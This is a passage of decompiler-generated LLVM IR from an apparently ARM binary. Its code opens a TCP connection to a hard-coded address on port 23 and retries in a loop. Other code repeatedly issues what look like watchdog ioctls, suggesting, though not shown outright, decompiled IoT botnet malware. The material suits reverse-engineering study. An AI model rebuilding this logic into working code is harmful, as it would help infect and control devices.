  %v1_d4d0 = call i32 @function_fd40(i32 18)
  %v1_d4d8 = call i32 @function_fd40(i32 19)
  store i32 %v2_d4e0, i32* %r1.global-to-local, align 4
  %v3_d4e8 = call i32 @function_fc7c(i32 18, i32* nonnull %stack_var_-44)
  store i32 %v2_d4ec, i32* %r1.global-to-local, align 4
  store i32 %v3_d4e8, i32* @r6, align 4
  %v3_d4f8 = call i32 @function_fc7c(i32 19, i32* nonnull %stack_var_-48)
  store i32 %v3_d4f8, i32* @r7, align 4
  store i32 %v2_d504, i32* @r4, align 4
  %v0_d50856 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v2_d504, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_d51457 = call i32 @function_10978(i32 %v0_d50856)
  %tmp141 = icmp slt i32 %v1_d51457, 1
  br i1 %tmp141, label %dec_label_pc_d650, label %dec_label_pc_d520

dec_label_pc_d520:                                ; preds = %dec_label_pc_d4cc, %dec_label_pc_d508.backedge
  %v0_d55447 = phi i32 [ %v1_d514, %dec_label_pc_d508.backedge ], [ %v1_d51457, %dec_label_pc_d4cc ]
  %v3_d524 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d524, i32* @r5, align 4
  %v5_d52c = icmp slt i32 %v0_d55447, %v3_d524
  br i1 %v5_d52c, label %dec_label_pc_d53c, label %dec_label_pc_d590.lr.ph

dec_label_pc_d590.lr.ph:                          ; preds = %dec_label_pc_d520
  %v1_d58839 = add i32 %v0_d55447, -1
  store i32 %v1_d58839, i32* %r1.global-to-local, align 4
  %v0_d590.pre = load i32, i32* @r6, align 4
  %v1_d594.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d590

dec_label_pc_d53c:                                ; preds = %dec_label_pc_d588.backedge, %dec_label_pc_d520
  store i32 %v2_d0d0, i32* %r1.global-to-local, align 4
  %v3_d540 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d540, i32* @lr, align 4
  %v5_d548 = icmp slt i32 %v0_d55447, %v3_d540
  br i1 %v5_d548, label %dec_label_pc_d508.backedge, label %.thread25

dec_label_pc_d508.backedge:                       ; preds = %dec_label_pc_d570, %.thread25, %dec_label_pc_d53c
  %v0_d508 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v2_d504, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v1_d514 = call i32 @function_10978(i32 %v0_d508)
  %tmp142 = icmp slt i32 %v1_d514, 1
  br i1 %tmp142, label %dec_label_pc_d650, label %dec_label_pc_d520

.thread25:                                        ; preds = %dec_label_pc_d53c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d55449 = icmp eq i32 %v0_d55447, 0
  br i1 %v2_d55449, label %dec_label_pc_d508.backedge, label %dec_label_pc_d55c.lr.ph

dec_label_pc_d55c.lr.ph:                          ; preds = %.thread25
  %v0_d55c.pre = load i32, i32* @r7, align 4
  %v1_d560.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d55c

dec_label_pc_d55c:                                ; preds = %dec_label_pc_d570, %dec_label_pc_d55c.lr.ph
  %v0_d554.in = phi i32 [ %v0_d55447, %dec_label_pc_d55c.lr.ph ], [ %v0_d554, %dec_label_pc_d570 ]
  %v0_d570 = phi i32 [ 0, %dec_label_pc_d55c.lr.ph ], [ %v1_d570, %dec_label_pc_d570 ]
  %v1_d55c = phi i32 [ 0, %dec_label_pc_d55c.lr.ph ], [ %v1_d55c86, %dec_label_pc_d570 ]
  %v0_d554 = add i32 %v0_d554.in, -1
  %v2_d55c = add i32 %v1_d55c, %v0_d55c.pre
  %v3_d55c = inttoptr i32 %v2_d55c to i8*
  %v4_d55c = load i8, i8* %v3_d55c, align 1
  %v6_d55c = zext i8 %v4_d55c to i32
  store i32 %v6_d55c, i32* %r2.global-to-local, align 4
  %v2_d560 = add i32 %v0_d570, %v1_d560.pre
  %v3_d560 = inttoptr i32 %v2_d560 to i8*
  %v4_d560 = load i8, i8* %v3_d560, align 1
  %v6_d560 = zext i8 %v4_d560 to i32
  store i32 %v6_d560, i32* %r3.global-to-local, align 4
  %v9_d564 = icmp eq i8 %v4_d560, %v4_d55c
  br i1 %v9_d564, label %dec_label_pc_d5ac, label %bb143

bb143:                                            ; preds = %dec_label_pc_d55c
  br label %dec_label_pc_d570

dec_label_pc_d570:                                ; preds = %bb143, %dec_label_pc_d5ac
  %v1_d55c86 = phi i32 [ %v1_d5ac, %dec_label_pc_d5ac ], [ 0, %bb143 ]
  %v1_d570 = add i32 %v0_d570, 1
  store i32 %v1_d570, i32* %r1.global-to-local, align 4
  %v2_d554 = icmp eq i32 %v0_d554, 0
  br i1 %v2_d554, label %dec_label_pc_d508.backedge, label %dec_label_pc_d55c

dec_label_pc_d578:                                ; preds = %dec_label_pc_d590
  %v1_d578 = add i32 %v1_d590, 1
  store i32 %v1_d578, i32* @lr, align 4
  %v9_d57c = icmp eq i32 %v3_d524, %v1_d578
  br i1 %v9_d57c, label %dec_label_pc_d5b8, label %dec_label_pc_d588.backedge

dec_label_pc_d588.backedge:                       ; preds = %dec_label_pc_d578, %dec_label_pc_d5a4
  %v1_d59077 = phi i32 [ 0, %dec_label_pc_d5a4 ], [ %v1_d578, %dec_label_pc_d578 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d588 = add i32 %v0_d588, -1
  store i32 %v1_d588, i32* %r1.global-to-local, align 4
  %v2_d588 = icmp eq i32 %v0_d588, 0
  br i1 %v2_d588, label %dec_label_pc_d53c, label %dec_label_pc_d590

dec_label_pc_d590:                                ; preds = %dec_label_pc_d588.backedge, %dec_label_pc_d590.lr.ph
  %v0_d588 = phi i32 [ %v1_d58839, %dec_label_pc_d590.lr.ph ], [ %v1_d588, %dec_label_pc_d588.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d590.lr.ph ], [ %storemerge, %dec_label_pc_d588.backedge ]
  %v1_d590 = phi i32 [ 0, %dec_label_pc_d590.lr.ph ], [ %v1_d59077, %dec_label_pc_d588.backedge ]
  %v2_d590 = add i32 %v1_d590, %v0_d590.pre
  %v3_d590 = inttoptr i32 %v2_d590 to i8*
  %v4_d590 = load i8, i8* %v3_d590, align 1
  %v6_d590 = zext i8 %v4_d590 to i32
  store i32 %v6_d590, i32* %r2.global-to-local, align 4
  %v2_d594 = add i32 %storemerge.in, %v1_d594.pre
  %v3_d594 = inttoptr i32 %v2_d594 to i8*
  %v4_d594 = load i8, i8* %v3_d594, align 1
  %v6_d594 = zext i8 %v4_d594 to i32
  store i32 %v6_d594, i32* %r3.global-to-local, align 4
  %v9_d598 = icmp eq i8 %v4_d594, %v4_d590
  br i1 %v9_d598, label %dec_label_pc_d578, label %dec_label_pc_d5a4

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d590
  br label %dec_label_pc_d588.backedge

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d55c
  %v1_d5ac = add i32 %v1_d55c, 1
  %v9_d5b0 = icmp eq i32 %v3_d540, %v1_d5ac
  br i1 %v9_d5b0, label %dec_label_pc_d5b8, label %dec_label_pc_d570

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d578, %dec_label_pc_d5ac
  %v1_d5bc = call i32 @function_fca0(i32 18)
  %v1_d5c4 = call i32 @function_fca0(i32 19)
  %v0_d5c8 = load i32, i32* %sl.global-to-local, align 4
  %v1_d5cc = call i32 @function_10be0(i32 %v0_d5c8)
  %v0_d5d0 = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d5d8 = call i32 @function_109ac(i32 %v0_d5d0, i32 9)
  br label %dec_label_pc_d5dc

dec_label_pc_d5dc:                                ; preds = %dec_label_pc_d4b4, %dec_label_pc_d650, %dec_label_pc_d5b8
  store i32 %v2_d340, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d5e4 = call i32 @function_101b4()
  store i32 %v2_d390, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d5f4 = call i32 @function_101b4()
  %v1_d5fc = call i32 @function_12cc8(i32 1)
  store i32 %v2_d318, i32* @r7, align 4
  %v0_d604 = load i32, i32* @r8, align 4
  store i32 %v0_d604, i32* @sl, align 4
  br label %dec_label_pc_d268.backedge

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d144
  %v1_d614 = call i32 @function_c93c(i32 42448)
  %v2_d618 = icmp eq i32 %v1_d614, 0
  br i1 %v2_d618, label %dec_label_pc_d620, label %dec_label_pc_d154

dec_label_pc_d620:                                ; preds = %dec_label_pc_d60c
  %v1_d624 = call i32 @function_c93c(i32 20480)
  %v2_d628 = icmp eq i32 %v1_d624, 0
  br i1 %v2_d628, label %dec_label_pc_d630, label %dec_label_pc_d154

dec_label_pc_d630:                                ; preds = %dec_label_pc_d620
  %v1_d638 = call i32 @function_c93c(i32 34254)
  %v2_d63c = icmp eq i32 %v1_d638, 0
  br i1 %v2_d63c, label %dec_label_pc_d644, label %dec_label_pc_d154

dec_label_pc_d644:                                ; preds = %dec_label_pc_d630
  %v0_d644 = load i32, i32* @r5, align 4
  %v1_d648 = call i32 @function_c93c(i32 %v0_d644)
  br label %dec_label_pc_d154

dec_label_pc_d650:                                ; preds = %dec_label_pc_d508.backedge, %dec_label_pc_d4cc
  %v1_d654 = call i32 @function_fca0(i32 18)
  %v1_d65c = call i32 @function_fca0(i32 19)
  %v0_d660 = load i32, i32* %sl.global-to-local, align 4
  %v1_d664 = call i32 @function_10be0(i32 %v0_d660)
  br label %dec_label_pc_d5dc

; uselistorder directives
  uselistorder i32 %v1_d5ac, { 1, 0 }
  uselistorder i32 %v1_d570, { 1, 0 }
  uselistorder i32 %v1_d55c, { 1, 0 }
  uselistorder i32 %v0_d570, { 1, 0 }
  uselistorder i32 %v1_d514, { 1, 0 }
  uselistorder i32 %v2_d4bc, { 1, 0 }
  uselistorder i1 %v7_d498, { 1, 0 }
  uselistorder i32 %v2_d494, { 1, 0 }
  uselistorder i32 %v2_d26c, { 1, 0 }
  uselistorder i32 %stack_var_-8484.1.be, { 1, 0 }
  uselistorder i32 %v3_d3ec, { 1, 2, 0 }
  uselistorder i32 %v2_d2fc, { 1, 0 }
  uselistorder i32 %v1_d29c, { 0, 1, 5, 4, 3, 2, 6, 9, 8, 7 }
  uselistorder i32 %v1_d278, { 2, 1, 0, 3 }
  uselistorder i32 %v3_d23c, { 1, 2, 0 }
  uselistorder i32 %v3_d204, { 2, 1, 0 }
  uselistorder i32 %v3_d1d0, { 1, 2, 0 }
  uselistorder i32 %v3_d198, { 1, 2, 0 }
  uselistorder i32 %v3_d160, { 2, 1, 0 }
  uselistorder i32 %v3_d118, { 1, 2, 0 }
  uselistorder i32 %stack_var_-8484.0, { 1, 0 }
  uselistorder i32 %v2_d504, { 1, 0, 2 }
  uselistorder i32 %v2_d390, { 1, 0, 2 }
  uselistorder i32 %v3_d010, { 1, 0 }
  uselistorder i32 %v2_cfdc, { 2, 0, 1 }
  uselistorder i32 %v1_cf78, { 3, 2, 0, 4, 6, 5, 8, 7, 9, 10, 1, 11, 12, 13 }
  uselistorder i32 %storemerge96, { 1, 0 }
  uselistorder i32 %v0_cee8, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 0, 7, 6, 1, 2, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 52, 51, 53, 54, 55, 56 }
  uselistorder i32 (i32*)* @function_10f20, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 20480, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_10ddc, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10944, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_20784.63, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d5dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d5b8, { 1, 0 }
  uselistorder label %dec_label_pc_d588.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d570, { 1, 0 }
  uselistorder label %dec_label_pc_d520, { 1, 0 }
  uselistorder label %dec_label_pc_d4b4, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d268.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d448, { 1, 0 }
  uselistorder label %dec_label_pc_d278, { 1, 0 }
  uselistorder label %dec_label_pc_d278.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d230, { 1, 0 }
  uselistorder label %dec_label_pc_d1f8, { 1, 0 }
  uselistorder label %dec_label_pc_d1c4, { 1, 0 }
  uselistorder label %dec_label_pc_d18c, { 1, 0 }
  uselistorder label %dec_label_pc_d154, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_d144, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @function_d67c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_d67c:
  store i32 ptrtoint (i32* @global_var_d7f4.68 to i32), i32* inttoptr (i32 124212 to i32*), align 4
  ret i32 %arg1
}

define i32 @function_d694(i32 %arg1) local_unnamed_addr {
dec_label_pc_d694:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d694 = load i32, i32* @r6, align 4
  %v12_d694 = load i32, i32* @r7, align 4
  %v15_d694 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d6b0 = call i32 @function_113bc(i32 2, i32 1, i32 0)
  store i32 %v3_d6b0, i32* %r0.global-to-local, align 4
  store i32 124204, i32* @r6, align 4
  %v7_d6b8 = icmp eq i32 %v3_d6b0, -1
  store i32 %v3_d6b0, i32* inttoptr (i32 124204 to i32*), align 4
  br i1 %v7_d6b8, label %dec_label_pc_d694.dec_label_pc_d770_crit_edge, label %dec_label_pc_d6c4

dec_label_pc_d694.dec_label_pc_d770_crit_edge:    ; preds = %dec_label_pc_d694
  %v1_d778.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d770

dec_label_pc_d6c4:                                ; preds = %dec_label_pc_d694
  %v2_d6c4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d6c4, i32* @r3, align 4
  %v0_d6c8 = load i32, i32* @r4, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  %v0_d6d8 = load i32, i32* %r0.global-to-local, align 4
  %v5_d6d8 = call i32 @function_11378(i32 %v0_d6d8, i32 %v0_d6c8, i32 2, i32 %v2_d6c4, i32 4)
  store i32 %v5_d6d8, i32* %r0.global-to-local, align 4
  %v0_d6dc = load i32, i32* @r6, align 4
  %v1_d6dc = inttoptr i32 %v0_d6dc to i32*
  %v2_d6dc = load i32, i32* %v1_d6dc, align 4
  store i32 %v2_d6dc, i32* %r4.global-to-local, align 4
  store i32 %v2_d6dc, i32* %r0.global-to-local, align 4
  %v2_d6ec = call i32 @function_10a14(i32 %v2_d6dc, i32 3)
  %v0_d6f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v2_d6dc, i32* %r0.global-to-local, align 4
  %v2_d6fc = call i32 @function_10a14(i32 %v2_d6dc, i32 %v0_d6f0)
  store i32 %v2_d6fc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @1 to i32), i32* @r8, align 4
  %v0_d72c = call i32 @function_11008()
  store i32 %v0_d72c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v2_d734 = inttoptr i32 %v0_d72c to i32*
  store i32 0, i32* %v2_d734, align 4
  %v2_d738 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d738, i32* @r5, align 4
  store i32 %v0_d72c, i32* %r4.global-to-local, align 4
  %v0_d748 = load i32, i32* @r6, align 4
  %v1_d748 = inttoptr i32 %v0_d748 to i32*
  %v2_d748 = load i32, i32* %v1_d748, align 4
  store i32 %v2_d748, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d754 = call i32 @function_1116c(i32 %v2_d748, i32 %v2_d738, i32 16)
  store i32 %v3_d754, i32* %r0.global-to-local, align 4
  %v7_d758 = icmp eq i32 %v3_d754, -1
  br i1 %v7_d758, label %dec_label_pc_d77c, label %dec_label_pc_d760

dec_label_pc_d760:                                ; preds = %dec_label_pc_d6c4
  %v2_d768 = load i32, i32* inttoptr (i32 124204 to i32*), align 4
  store i32 %v2_d768, i32* %r0.global-to-local, align 4
  %v2_d76c = call i32 @function_11258(i32 %v2_d768, i32 1)
  store i32 %v2_d76c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d770

dec_label_pc_d770:                                ; preds = %dec_label_pc_d694.dec_label_pc_d770_crit_edge, %dec_label_pc_d788, %dec_label_pc_d760
  %v1_d778 = phi i32 [ %v1_d778.pre, %dec_label_pc_d694.dec_label_pc_d770_crit_edge ], [ %v1_d7cc, %dec_label_pc_d788 ], [ %v2_d76c, %dec_label_pc_d760 ]
  store i32 %v9_d694, i32* @r6, align 4
  store i32 %v12_d694, i32* @r7, align 4
  store i32 %v15_d694, i32* @r8, align 4
  ret i32 %v1_d778

dec_label_pc_d77c:                                ; preds = %dec_label_pc_d6c4
  %v0_d77c = load i32, i32* %r4.global-to-local, align 4
  %v1_d77c = inttoptr i32 %v0_d77c to i32*
  %v2_d77c = load i32, i32* %v1_d77c, align 4
  %v7_d780 = icmp eq i32 %v2_d77c, 99
  br i1 %v7_d780, label %dec_label_pc_d7d4, label %dec_label_pc_d788

dec_label_pc_d788:                                ; preds = %dec_label_pc_d7d4, %bb, %dec_label_pc_d77c
  store i32 9510, i32* @r4, align 4
  %v0_d7a0 = load i32, i32* @r6, align 4
  %v1_d7a0 = inttoptr i32 %v0_d7a0 to i32*
  %v2_d7a0 = load i32, i32* %v1_d7a0, align 4
  store i32 %v2_d7a0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d7b0 = call i32 @function_111a4(i32 %v2_d7a0, i32 %v2_d738, i32 16)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_d7b8 = call i32 @function_12cc8(i32 5)
  store i32 %v1_d7b8, i32* %r0.global-to-local, align 4
  %v0_d7bc = load i32, i32* @r6, align 4
  %v1_d7bc = inttoptr i32 %v0_d7bc to i32*
  %v2_d7bc = load i32, i32* %v1_d7bc, align 4
  store i32 %v2_d7bc, i32* %r0.global-to-local, align 4
  %v1_d7c0 = call i32 @function_10be0(i32 %v2_d7bc)
  %v0_d7c4 = load i32, i32* @r4, align 4
  store i32 %v0_d7c4, i32* %r0.global-to-local, align 4
  %v1_d7c8 = call i32 @function_c93c(i32 %v0_d7c4)
  store i32 %v1_d7c8, i32* %r0.global-to-local, align 4
  %v1_d7cc = call i32 @function_d694(i32 %v1_d7c8)
  store i32 %v1_d7cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d770

dec_label_pc_d7d4:                                ; preds = %dec_label_pc_d77c
  %v0_d7d4 = load i32, i32* @r8, align 4
  %v1_d7d4 = inttoptr i32 %v0_d7d4 to i8*
  %v2_d7d4 = load i8, i8* %v1_d7d4, align 1
  %v3_d7d4 = zext i8 %v2_d7d4 to i32
  %v1_d7d8 = load i32, i32* @r7, align 4
  %v9_d7d8 = icmp eq i32 %v3_d7d4, %v1_d7d8
  br i1 %v9_d7d8, label %dec_label_pc_d788, label %bb

bb:                                               ; preds = %dec_label_pc_d7d4
  %v2_d7e0 = trunc i32 %v1_d7d8 to i8
  store i8 %v2_d7e0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @1, i32 0, i32 0), align 1
  br label %dec_label_pc_d788

; uselistorder directives
  uselistorder i32 %v1_d7cc, { 1, 0 }
  uselistorder i32 %v2_d738, { 1, 0, 2 }
  uselistorder i32 %v2_d6dc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_d6b0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 19, 0, 2, 1, 3, 5, 4, 7, 6, 9, 8, 10, 12, 11, 13, 14, 16, 17, 18, 15 }
  uselistorder i32 (i32)* @function_c93c, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_11258, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1116c, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder [4 x i8]* @1, { 1, 0 }
  uselistorder i32* inttoptr (i32 124204 to i32*), { 1, 0 }
  uselistorder label %dec_label_pc_d788, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d770, { 1, 2, 0 }
}

define i32 @function_d7e8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d7e8:
  %v0_d7e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d7e8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_d7e8
  %v5_d7f0 = mul i32 %arg1, 32768
  %v6_d7f0 = and i32 %v5_d7f0, %arg3
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_d7e8, %bb
  %v7_d7f0 = phi i32 [ %arg1, %dec_label_pc_d7e8 ], [ %v6_d7f0, %bb ]
  ret i32 %v7_d7f0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_d7f4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_d7f4:
  %v1_d7fc = call i32 @function_fd40(i32 1)
  store i32 ptrtoint ([15 x i8]* @global_var_15f50.74 to i32), i32* @r0, align 4
  %v2_d804 = call i32 @function_11144(i32 ptrtoint ([15 x i8]* @global_var_15f50.74 to i32))
  store i32 ptrtoint (i16** @global_var_2078c.76 to i32), i32* @r4, align 4
  store i32 %v2_d804, i32* @global_var_20790.77, align 4
  %v3_d818 = call i32 @function_fc7c(i32 1, i32* null)
  %v4_d818 = inttoptr i32 %v3_d818 to i16*
  %v3_d81c = load i16, i16* %v4_d818, align 2
  store i16 %v3_d81c, i16* bitcast (i32* @global_var_2078e.78 to i16*), align 4
  %v1_d828 = call i32 @function_fca0(i32 1)
  ret i32 %v1_d828
}

define i32 @function_d83c(i32 %arg1) local_unnamed_addr {
dec_label_pc_d83c:
  %stack_var_-20 = alloca i32, align 4
  %v3_d83c = load i32, i32* @r4, align 4
  %v6_d83c = load i32, i32* @r5, align 4
  %v9_d83c = load i32, i32* @lr, align 4
  %v0_d844 = call i32 @function_108d0()
  %v7_d848 = icmp eq i32 %v0_d844, -1
  %. = zext i1 %v7_d848 to i32
  %tmp11 = icmp slt i32 %v0_d844, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d864 = icmp eq i32 %storemerge4, 0
  store i32 %v0_d844, i32* @global_var_1e700.80, align 4
  br i1 %v2_d864, label %dec_label_pc_d87c, label %dec_label_pc_d870

dec_label_pc_d870:                                ; preds = %dec_label_pc_d83c
  store i32 %v3_d83c, i32* @r4, align 4
  store i32 %v6_d83c, i32* @r5, align 4
  store i32 %v9_d83c, i32* @lr, align 4
  ret i32 %v0_d844

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d83c
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d888 = call i32 @function_fd40(i32 23)
  %v1_d890 = call i32 @function_fd40(i32 24)
  %v0_d894 = load i32, i32* @r5, align 4
  %v2_d89c = inttoptr i32 %v0_d894 to i32*
  %v3_d89c = call i32 @function_fc7c(i32 23, i32* %v2_d89c)
  %v2_d8a4 = call i32 @function_107ec(i32 %v3_d89c, i32 2)
  %v7_d8a8 = icmp eq i32 %v2_d8a4, -1
  store i32 %v2_d8a4, i32* @r4, align 4
  br i1 %v7_d8a8, label %dec_label_pc_d8f0, label %dec_label_pc_d8b4

dec_label_pc_d8b4:                                ; preds = %dec_label_pc_d8f0, %dec_label_pc_d87c
  %v0_d8c0 = phi i32 [ %v2_d900, %dec_label_pc_d8f0 ], [ %v2_d8a4, %dec_label_pc_d87c ]
  %v2_d8c4 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d8c8 = call i32 @function_10b54(i32 %v0_d8c0, i32 -2147199228, i32 %v2_d8c4)
  br label %dec_label_pc_d8cc

dec_label_pc_d8cc:                                ; preds = %dec_label_pc_d8cc, %dec_label_pc_d8b4
  %v0_d8d8 = load i32, i32* @r4, align 4
  %v3_d8e0 = call i32 @function_10b54(i32 %v0_d8d8, i32 -2147199227, i32 0)
  %v1_d8e8 = call i32 @function_12cc8(i32 10)
  br label %dec_label_pc_d8cc

dec_label_pc_d8f0:                                ; preds = %dec_label_pc_d87c
  %v0_d8f0 = load i32, i32* @r5, align 4
  %v2_d8f8 = inttoptr i32 %v0_d8f0 to i32*
  %v3_d8f8 = call i32 @function_fc7c(i32 24, i32* %v2_d8f8)
  %v2_d900 = call i32 @function_107ec(i32 %v3_d8f8, i32 2)
  %v3_d904 = icmp eq i32 %v2_d900, -1
  store i32 %v2_d900, i32* @r4, align 4
  br i1 %v3_d904, label %dec_label_pc_d910, label %dec_label_pc_d8b4

dec_label_pc_d910:                                ; preds = %dec_label_pc_d8f0
  %v1_d914 = call i32 @function_fca0(i32 23)
  %v1_d91c = call i32 @function_fca0(i32 24)
  %v0_d920 = load i32, i32* @r5, align 4
  %v1_d924 = call i32 @function_12c10(i32 %v0_d920)
  %v0_d928 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d928, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_d910
  store i32 0, i32* @lr, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d910, %bb14
  ret i32 %v1_d924

; uselistorder directives
  uselistorder i32 %v2_d900, { 1, 2, 0 }
  uselistorder i32 %v2_d8a4, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d844, { 2, 1, 3, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_d92c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_d92c:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1416 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v15_d92c = load i32, i32* @r8, align 4
  %v2_d938 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d938, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d950 = call i32 @function_11454(i32* nonnull %stack_var_-64)
  store i32 %v2_d938, i32* @r0, align 4
  %v2_d95c = call i32 @function_11410(i32 %v2_d938, i32 2)
  %v0_d960 = load i32, i32* @r5, align 4
  store i32 %v0_d960, i32* %r2.global-to-local, align 4
  %v3_d96c = call i32 @function_10ba8(i32 %v0_d960, i32 %v2_d938, i32 %v0_d960)
  %v2_d978 = call i32 @function_11468(i32 17, i32 1)
  %v2_d984 = call i32 @function_11468(i32 5, i32 54908)
  %v0_d988 = call i32 @function_103dc()
  store i32 ptrtoint (i16** @global_var_2078c.76 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_20790.77, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d988, i32* @global_var_20780.45, align 4
  store i16 5888, i16* bitcast (i32* @global_var_2078e.78 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_2078c.76 to i16*), align 4
  %v6_d9b0 = call i32 @function_fde0(i32 %v0_d988, i32 ptrtoint (i32* @global_var_20780.45 to i32), i32 ptrtoint (i16** @global_var_2078c.76 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d7f4.68 to i32), i32* %r3.global-to-local, align 4
  store i32 124212, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_d7f4.68 to i32), i32* inttoptr (i32 124212 to i32*), align 4
  %v1_d9c0 = call i32 @function_d694(i32 %v6_d9b0)
  %v1_d9c4 = call i32 @function_e0f0(i32 %v1_d9c0)
